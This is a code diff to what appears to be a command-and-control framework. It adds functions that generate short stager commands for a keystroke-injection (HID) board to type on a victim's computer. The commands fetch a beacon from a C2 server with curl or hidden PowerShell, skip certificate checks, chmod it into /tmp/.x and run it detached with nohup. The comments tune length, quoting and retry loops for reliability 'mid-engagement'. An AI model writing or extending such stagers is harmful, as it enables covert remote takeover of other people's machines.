@@ -37,6 +37,26 @@ LOADERS = ("powershell", "mshta")
 # default retry cadence (seconds) for the client-side loop
 DEFAULT_RETRY_S = 30
 
+# The board TYPES the command on screen, one keystroke at a time. The full
+# resilient PIC stager is ~11.4k chars (measured: an operator timed minutes of
+# typing on a Leonardo): a long visible window, and boards drop keystrokes on
+# long runs. This is the ceiling the download-mode command is held to, and
+# `hid_download_command` refuses to hand back anything longer — "it is short"
+# is the entire reason the download mode exists.
+MAX_TYPED_CHARS = 600
+
+# Where a SHORT stager fetches from. Two different KINDS of endpoint, one
+# pairing to get right: Windows iex's a SCRIPT (the raw shellcode `/x` carries
+# is not text), while the POSIX families fetch the compiled beacon directly.
+# The pairing lives here, next to `build_short_stager`, so no call site can
+# pick the wrong one.
+_DOWNLOAD_ROUTES = {
+    "windows": "/s/windows",
+    "linux": "/api/v1/payload_linux",
+    "macos": "/api/v1/payload_macos",
+    "android": "/api/v1/payload_android",
+}
+
 _PLATFORMS = ("windows", "macos", "linux", "android")
 
 
@@ -126,6 +146,18 @@ def build_short_stager(platform: str, url: str, *,
         raise ValueError(f"unknown platform {platform!r}: choose from "
                          f"{', '.join(_PLATFORMS)}")
 
+    # The URL travels inside a quoted wrapper on every platform (`iwr '…'` on
+    # Windows, `"…"` inside the single-quoted `sh -c` on POSIX). A quote, `$`
+    # or backtick in it would end that wrapper early and hand the target a
+    # TRUNCATED command — which is worse than a long one, because it looks
+    # right on screen and then fails with nothing to read. Refusing here is
+    # cheap; finding it on a board mid-engagement is not.
+    for bad in ("'", '"', "$", "`"):
+        if bad in url:
+            raise ValueError(
+                f"stager URL contains {bad!r}, which the typed command "
+                f"cannot quote safely")
+
     if platform == "windows":
         loader = (loader or "powershell").lower()
         if loader not in LOADERS:
@@ -139,13 +171,26 @@ def build_short_stager(platform: str, url: str, *,
         return 'powershell -w h -c "' + loop + '"'
 
     # POSIX: sh -c '<loop>; <run detached>'
+    #
+    # The URL is DOUBLE-quoted even though the wrapper is SINGLE-quoted, and
+    # that is deliberate rather than a quoting accident. Nesting the same
+    # quote character is not a syntax error — adjacent quoted and unquoted
+    # parts CONCATENATE, so `sh -c 'a 'b' c'` still hands sh one script — but
+    # the URL comes out of it UNQUOTED, i.e. subject to word splitting and
+    # pathname globbing inside the script, and the `?` of `?auth=<token>` is a
+    # glob character. Distinct quoting keeps the URL one literal word; the
+    # characters a double-quoted URL would let the shell EXPAND (`$`, backtick,
+    # quotes) are refused above, so this is strictly the narrower form.
+    #
+    # -f turns an HTTP error (403/404) into a curl FAILURE, so the loop keeps
+    # retrying instead of chmod-ing an error page and calling it delivered.
     # -k skips cert verification (self-signed C2) and is only meaningful over
     # TLS, so it is added solely for the https case.
-    insecure = "k" if ssl else ""
+    flags = "sf" + ("k" if ssl else "")
     out = "/tmp/.x"
     run = (f"{out} {host} {int(port)} {1 if ssl else 0}"
            if host else f"{out}")
-    inner = (f"while ! curl -s{insecure} '{url}' -o {out};do sleep "
+    inner = (f'while ! curl -{flags} "{url}" -o {out};do sleep '
              f"{max(1, int(retry_s))};done;chmod +x {out};"
              f"nohup {run} >/dev/null 2>&1 &")
     return "sh -c '" + inner + "'"
@@ -164,6 +209,68 @@ def build_universal_fetch(url: str) -> str:
     if not url:
         raise ValueError("universal fetch needs a URL")
     return url
+
+
+def download_route(platform: str) -> str:
+    """The C2 route the TYPED short command fetches for ``platform``.
+
+    ``""`` for a platform we have no artefact for, so a caller can refuse
+    instead of guessing an endpoint.
+    """
+    return _DOWNLOAD_ROUTES.get((platform or "").lower(), "")
+
+
+def short_stager_url(platform: str, base_url: str, token: str = "") -> str:
+    """The URL `build_short_stager` needs for ``platform``.
+
+    Windows gets the SCRIPT route, the POSIX families the binary one. Handing
+    the Windows (``iex``) form a route that serves a PE would have PowerShell
+    evaluate a binary as source — which is the mistake this function exists
+    to make impossible. Raises ``ValueError`` on a platform with no route or
+    an empty base URL.
+    """
+    route = download_route(platform)
+    if not route:
+        raise ValueError(f"no download route for platform {platform!r}")
+    base = (base_url or "").strip().rstrip("/")
+    if not base:
+        raise ValueError("short stager needs a base URL")
+    url = base + route
+    if token:
+        url += f"?auth={token}"
+    return url
+
+
+def hid_download_command(platform: str, host: str, port: int, *,
+                         token: str = "", ssl: bool = True,
+                         retry_s: int = DEFAULT_RETRY_S) -> str:
+    """The command a HID board types in ``--stager-mode download``.
+
+    ONE function decides the endpoint, the fetch and the length cap, so the
+    HID path cannot drift from the C2 route that serves the artefact. Raises
+    ``ValueError`` when the result would not fit the HID budget: an operator
+    already holding a board needs a refusal, not a three-minute typing
+    session they cannot see the end of.
+
+    Download is the HID DEFAULT — the board types a fetcher and the beacon is
+    downloaded — which is the opposite of what the paste-a-one-liner channels
+    want (nothing is typed there, so an inline dropper costs them nothing).
+    """
+    platform = (platform or "").lower()
+    if platform not in _PLATFORMS:
+        raise ValueError(f"unknown platform {platform!r}: choose from "
+                         f"{', '.join(_PLATFORMS)}")
+    scheme = "https" if ssl else "http"
+    url = short_stager_url(platform, f"{scheme}://{host}:{int(port)}", token)
+    command = build_short_stager(platform, url, host=host, port=int(port),
+                                 ssl=ssl, retry_s=retry_s)
+    if len(command) > MAX_TYPED_CHARS:
+        raise ValueError(
+            f"the {platform} download stager is {len(command)} chars, over "
+            f"the {MAX_TYPED_CHARS}-char HID budget (an over-long host "
+            f"{host!r} is the usual cause) — shorten the address, or use "
+            f"--stager-mode inline")
+    return command
 
 
 def loader_notes(platform: str, loader: str = "powershell") -> Tuple[str, ...]:
